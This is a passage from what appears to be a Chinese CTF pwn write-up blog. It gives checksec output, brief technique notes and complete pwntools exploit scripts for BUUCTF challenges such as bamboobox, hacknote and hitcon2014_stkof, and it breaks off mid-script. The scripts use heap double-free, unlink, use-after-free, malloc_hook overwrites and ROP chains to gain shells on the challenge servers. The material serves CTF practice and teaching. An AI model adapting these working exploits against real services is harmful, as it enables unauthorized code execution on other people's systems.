class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">     sh.recvuntil(&#39;:&#39;)</span><br><span class="line">     sh.sendline(&#39;4&#39;)</span><br><span class="line">     sh.recvuntil(&#39;:&#39;)</span><br><span class="line">     sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x10,&#39;aaa&#39;) #0</span><br><span class="line">add(0x60,&#39;bbb&#39;) #1</span><br><span class="line">add(0x10,&#39;ccc&#39;) #2</span><br><span class="line">add(0x40,&#39;ddd&#39;) #3</span><br><span class="line">add(0x10,&#39;eee&#39;) #4</span><br><span class="line">edit(0,0x20,&#39;a&#39;*0x10+p64(0)+p64(0xe1))</span><br><span class="line">free(1)</span><br><span class="line">add(0x60,&#39;aaaa&#39;) #1</span><br><span class="line">add(0x10,&#39;aaaa&#39;) #5&#x3D;&#x3D;&gt;2</span><br><span class="line">add(0x40,&#39;aaaa&#39;) #6</span><br><span class="line">add(0x10,&#39;aaaa&#39;) #7</span><br><span class="line">free(7)</span><br><span class="line">free(5)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&#39;2 : &#39;)</span><br><span class="line">heap_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">sh.success(&#39;heap_addr : &#39; +hex(heap_addr))</span><br><span class="line">heap_base&#x3D;heap_addr-0x140</span><br><span class="line">sh.success(&#39;heap_base : &#39; +hex(heap_base))</span><br><span class="line"></span><br><span class="line">magic&#x3D;0x0000000000400D49</span><br><span class="line">edit(2,0x8,p64(heap_base))</span><br><span class="line">add(0x10,&#39;aaaa&#39;) #8</span><br><span class="line">add(0x10,p64(0)+p64(magic)) #9</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;5&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="远程-1"><a href="#远程-1" class="headerlink" title="远程:"></a>远程:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;bamboobox&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29439)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bamboobox&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;x64-libc-2.23.so&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">     sh.recvuntil(&#39;:&#39;)</span><br><span class="line">     sh.sendline(&#39;4&#39;)</span><br><span class="line">     sh.recvuntil(&#39;:&#39;)</span><br><span class="line">     sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x10,&#39;aaaa&#39;) #0</span><br><span class="line">add(0x60,&#39;aaaa&#39;) #1</span><br><span class="line">add(0x60,&#39;aaaa&#39;) #2</span><br><span class="line">add(0x10,&#39;aaaa&#39;) #3</span><br><span class="line">edit(0,0x20,&#39;a&#39;*0x10+p64(0)+p64(0xe1))</span><br><span class="line">free(1)</span><br><span class="line">add(0x60,&#39;aaaa&#39;) #1</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&#39;2 : &#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;realloc&#39;]</span><br><span class="line">sh.success(&#39;realloc : &#39; +hex(realloc))</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line"></span><br><span class="line">add(0x60,&#39;aaaa&#39;) #4&#x3D;&#x3D;&gt;2</span><br><span class="line">free(4)</span><br><span class="line">edit(2,0x8,p64(malloc_hook-0x23))</span><br><span class="line">add(0x60,&#39;aaaa&#39;) #4</span><br><span class="line">add(0x60,&#39;a&#39;*3+p64(0)+p64(one_gadget)+p64(realloc)) #5</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;2&#39;)</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(str(0x10))</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h3><h4 id="checksec检查：-49"><a href="#checksec检查：-49" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="利用：-56"><a href="#利用：-56" class="headerlink" title="利用："></a>利用：</h4><p>首先申请一个0x410大小的chunk，然后free掉泄露libc，之后利用tcache的机制连续free俩次chunk，将chunk申请到malloc_hook处，程序需要进行抬栈操作。</p>
<h4 id="exp如下：-54"><a href="#exp如下：-54" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;ciscn_2019_es_1&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27779)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;ciscn_2019_es_1&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;18-64-libc-2.27.so&#39;)</span><br><span class="line"></span><br><span class="line">def add(size,name,call&#x3D;&#39;aaaa&#39;):</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.sendline(&#39;1&#39;)</span><br><span class="line">    sh.recvuntil(&quot;Please input the size of compary&#39;s name\n&quot;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&#39;please input name:\n&#39;)</span><br><span class="line">    sh.send(name)</span><br><span class="line">    sh.recvuntil(&#39;please input compary call:\n&#39;)</span><br><span class="line">    sh.send(call)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.sendline(&#39;2&#39;)</span><br><span class="line">    sh.recvuntil(&#39;Please input the index:\n&#39;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.sendline(&#39;3&#39;)</span><br><span class="line">    sh.recvuntil(&#39;Please input the index:\n&#39;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x410,&#39;aaaa&#39;) #0</span><br><span class="line">add(0x10,&#39;bbbb&#39;) #1</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&#39;name:\n&#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-96</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3ebc40</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">one_gadget&#x3D;libc_base+0x10a38c</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;realloc&#39;]</span><br><span class="line">sh.success(&#39;realloc : &#39; +hex(realloc))</span><br><span class="line"></span><br><span class="line">add(0x60,&#39;aaaa&#39;) #2</span><br><span class="line">add(0x60,&#39;bbbb&#39;) #3</span><br><span class="line">free(2)</span><br><span class="line">free(2)</span><br><span class="line">add(0x60,p64(malloc_hook-0x23)) #4</span><br><span class="line">add(0x60,&#39;aaaa&#39;) #5</span><br><span class="line">add(0x60,&#39;a&#39;*3+p64(0)*3+p64(one_gadget)+p64(realloc+0xe)) #6</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h3><h4 id="checksec检查：-50"><a href="#checksec检查：-50" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-57"><a href="#利用：-57" class="headerlink" title="利用："></a>利用：</h4><p>uaf利用，因为偏移有问题困扰了我好长时间，本来是简单题，结果。。。还是我太菜了啊。</p>
<h4 id="利用：-58"><a href="#利用：-58" class="headerlink" title="利用："></a>利用：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29258)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;16-32-libc-2.23.so&#39;)</span><br><span class="line">puts_addr&#x3D;0x0804862B</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x68,&#39;a&#39;*4) #0</span><br><span class="line">add(0x10,&#39;a&#39;*4) #1</span><br><span class="line">add(0x10,&#39;a&#39;*4) #2</span><br><span class="line">free(0)</span><br><span class="line">add(0x68,&#39;a&#39;*4) #3</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&#39;aaaa&#39;)</span><br><span class="line">main_arena&#x3D;u32(sh.recv(4))-48</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">#libc_base&#x3D;main_arena-0x1b3780</span><br><span class="line">libc_base&#x3D;main_arena-0x1B0780</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">system_addr &#x3D; libc.symbols[&#39;system&#39;]+libc_base</span><br><span class="line">sh.success(&#39;system_addr : &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(0x8,p32(system_addr)+&#39;;sh\x00&#39;)</span><br><span class="line">show(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a>wustctf2020_closed</h3><h4 id="checksec检查：-51"><a href="#checksec检查：-51" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-59"><a href="#利用：-59" class="headerlink" title="利用："></a>利用：</h4><p>用命令<code>exec 1&gt;&amp;0</code>把<code>stdout</code>重定向到<code>stdin</code>就返回shell了。关于重定向可以看一下这个链接。</p>
<p><a href="http://xstarcd.github.io/wiki/shell/exec_redirect.html" target="_blank" rel="noopener external nofollow noreferrer">http://xstarcd.github.io/wiki/shell/exec_redirect.html</a></p>
<h4 id="exp如下：-55"><a href="#exp如下：-55" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,26824)</span><br><span class="line">sh.sendline(&quot;exec 1&gt;&amp;0&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="mrctf2020-easyoverflow"><a href="#mrctf2020-easyoverflow" class="headerlink" title="mrctf2020_easyoverflow"></a>mrctf2020_easyoverflow</h3><h4 id="checksec检查：-52"><a href="#checksec检查：-52" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="利用：-60"><a href="#利用：-60" class="headerlink" title="利用："></a>利用：</h4><p>没啥说的</p>
<h4 id="exp如下：-56"><a href="#exp如下：-56" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;mrctf2020_easyoverflow&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29563)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x30+&#39;n0t_r3@11y_f1@g&#39;</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h3><h4 id="checksec检查：-53"><a href="#checksec检查：-53" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-61"><a href="#利用：-61" class="headerlink" title="利用："></a>利用：</h4><p>unlink攻击，首先通过unlink泄露libc，然后getshell</p>
<h4 id="exp如下：-57"><a href="#exp如下：-57" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29509)</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;OK\n&#39;)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(str(len(content)))</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(content)</span><br><span class="line">	sh.recvuntil(&#39;OK\n&#39;)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">chunk_ptr&#x3D;0x602150</span><br><span class="line">fd&#x3D;chunk_ptr-0x18</span><br><span class="line">bk&#x3D;chunk_ptr-0x10</span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">add(0x60) #1</span><br><span class="line">add(0x80) #2</span><br><span class="line">add(0x80) #3</span><br><span class="line">add(0x10) #4</span><br><span class="line">edit(2,p64(0)+p64(0x81)+p64(fd)+p64(bk)+&#39;a&#39;*0x60+p64(0x80)+p64(0x90))</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">edit(2,&#39;a&#39;*0x10+p64(free_got)+p64(puts_got))</span><br><span class="line">edit(1,p64(puts_plt))</span><br><span class="line">free(2)</span><br><span class="line">sh.recvuntil(&#39;OK\n&#39;)</span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line"></span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">libc_base&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">sh.success(&#39;libc_base: &#39; +hex(libc_base))</span><br><span class="line">system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]</span><br><span class="line">sh.success(&#39;system_addr: &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(1,p64(system_addr))</span><br><span class="line">edit(4,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level5"><a href="#jarvisoj-level5" class="headerlink" title="jarvisoj_level5"></a>jarvisoj_level5</h3><h4 id="checksec检查：-54"><a href="#checksec检查：-54" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-62"><a href="#利用：-62" class="headerlink" title="利用："></a>利用：</h4><p>和之前的一样，感觉是buu弄错了</p>
<h4 id="exp如下：-58"><a href="#exp如下：-58" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;level3_x64&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28929)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level3_x64&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">pop_rdi_ret&#x3D;0x00000000004006b3</span><br><span class="line">pop_rsi_r15_ret&#x3D;0x00000000004006b1</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x80 + 8)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)+p64(1) +p64(pop_rsi_r15_ret)+p64(read_got)+p64(0)+p64(write_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Input:\n&#39;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">read_addr&#x3D;u64(sh.recv(8))</span><br><span class="line">sh.success(&#39;read_addr : &#39; +hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;, read_addr)</span><br><span class="line">libc_base &#x3D; read_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">str_bin_sh &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x80 + 8)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)+p64(str_bin_sh) +p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h3><h4 id="checksec检查：-55"><a href="#checksec检查：-55" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-63"><a href="#利用：-63" class="headerlink" title="利用："></a>利用：</h4><p>程序将flag写到了bss段上，我们通过uaf将chunk申请到bss段上。</p>
<h4 id="exp如下：-59"><a href="#exp如下：-59" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;gyctf_2020_some_thing_exceting&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27045)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;gyctf_2020_some_thing_exceting&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,size2,content&#x3D;&#39;\n&#39;,content2&#x3D;&#39;\n&#39;):</span><br><span class="line">	sh.recvuntil(&#39;Now please tell me what you want to do :&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size2))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(content2)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;Now please tell me what you want to do :&#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;Now please tell me what you want to do :&#39;)</span><br><span class="line">	sh.sendline(&#39;4&#39;)</span><br><span class="line">	sh.recvuntil(&#39;Banana ID : &gt; SCP project ID : &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x58,0x58) #0</span><br><span class="line">add(0x58,0x58) #1</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x58,0x58,p64(0x602098)) #2</span><br><span class="line">add(0x58,0x58) #3</span><br><span class="line">add(0x58,0x20) #4</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(4)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h3><h4 id="checksec检查：-56"><a href="#checksec检查：-56" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-64"><a href="#利用：-64" class="headerlink" title="利用："></a>利用：</h4><p>栈迁移+ROP利用</p>
<h4 id="exp如下：-60"><a href="#exp如下：-60" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;ACTF_2019_babystack&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28438)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;ACTF_2019_babystack&#39;)</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">sh.sendline(str(0xe0))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Your message will be saved at &#39;)</span><br><span class="line">stack_addr&#x3D;int(sh.recv(14),16)</span><br><span class="line">sh.success(&#39;stack_addr : &#39; +hex(stack_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret&#x3D;0x0000000000400ad3</span><br><span class="line">leave_ret&#x3D;0x0000000000400a18</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span 